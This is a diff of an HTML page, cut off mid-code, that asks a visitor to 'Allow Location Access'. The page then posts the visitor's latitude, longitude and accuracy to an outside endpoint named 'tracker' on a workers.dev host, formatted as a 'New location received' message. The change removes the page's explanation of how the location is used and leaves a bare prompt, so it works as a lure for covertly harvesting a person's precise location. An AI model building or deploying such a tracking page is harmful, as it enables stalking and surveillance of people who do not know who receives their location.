@@ -1,134 +1,40 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>Location Access</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<style>
-  body {
-    margin: 0;
-    font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
-    background: linear-gradient(135deg, #1e293b, #0f172a);
-    color: white;
-    min-height: 100vh;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-  }
-
-  .card {
-    background: #111827;
-    padding: 28px;
-    max-width: 380px;
-    width: 90%;
-    border-radius: 14px;
-    box-shadow: 0 20px 40px rgba(0,0,0,0.4);
-    text-align: center;
-  }
-
-  h1 {
-    font-size: 22px;
-    margin-bottom: 10px;
-  }
-
-  p {
-    font-size: 14px;
-    opacity: 0.85;
-    line-height: 1.5;
-  }
-
-  button {
-    margin-top: 18px;
-    width: 100%;
-    padding: 14px;
-    font-size: 16px;
-    font-weight: 600;
-    border: none;
-    border-radius: 10px;
-    cursor: pointer;
-    background: #3b82f6;
-    color: white;
-    transition: 0.2s;
-  }
-
-  button:hover {
-    background: #2563eb;
-  }
-
-  .status {
-    margin-top: 15px;
-    font-size: 14px;
-    opacity: 0.9;
-  }
-
-  .footer {
-    margin-top: 14px;
-    font-size: 12px;
-    opacity: 0.6;
-  }
-</style>
+  <meta charset="UTF-8">
+  <title>Location Permission</title>
 </head>
 <body>
 
-<div class="card">
-  <h1>Enable Location Access</h1>
+<h2>Allow Location Access</h2>
+<button onclick="getLocation()">Allow</button>
 
-  <p>
-    We use your location to provide location-based functionality.
-    Your location is only shared after you approve.
-  </p>
-
-  <button onclick="getLocation()">Allow Location</button>
-
-  <div class="status" id="status"></div>
-
-  <div class="footer">
-    You can deny or revoke access at any time in your browser.
-  </div>
-</div>
+<p id="status"></p>
 
 <script>
-const WORKER_URL = "https://tracker.jovdat70.workers.dev/";
+
+const WEBHOOK_URL = "https://tracker.jovdat70.workers.dev/";
 
 function getLocation() {
   if (!navigator.geolocation) {
-    document.getElementById("status").textContent =
-      "Geolocation is not supported.";
+    document.getElementById("status").innerText =
+      "Geolocation not supported.";
     return;
   }
 
-  document.getElementById("status").textContent = "Requesting permission...";
-
   navigator.geolocation.getCurrentPosition(
     (pos) => {
-      const data = {
-        lat: pos.coords.latitude,
-        lon: pos.coords.longitude,
-        acc: pos.coords.accuracy
-      };
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+      const acc = pos.coords.accuracy;
 
-      fetch(WORKER_URL, {
+      fetch(WEBHOOK_URL, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(data)
-      })
-      .then(() => {
-        document.getElementById("status").textContent =
-          "Thanks! Location received successfully.";
-      })
-      .catch(() => {
-        document.getElementById("status").textContent =
-          "Could not send data.";
-      });
-    },
-    () => {
-      document.getElementById("status").textContent =
-        "Permission denied.";
-    }
-  );
-}
-</script>
-
-</body>
-</html>
+        body: JSON.stringify({
+          content:
+            "📍 **New location received**\n" +
+            `Latitude: ${lat}\n` +
+            `Longitude: ${lon}\n` +
+            `Accuracy: ±${acc} meters`
+        })
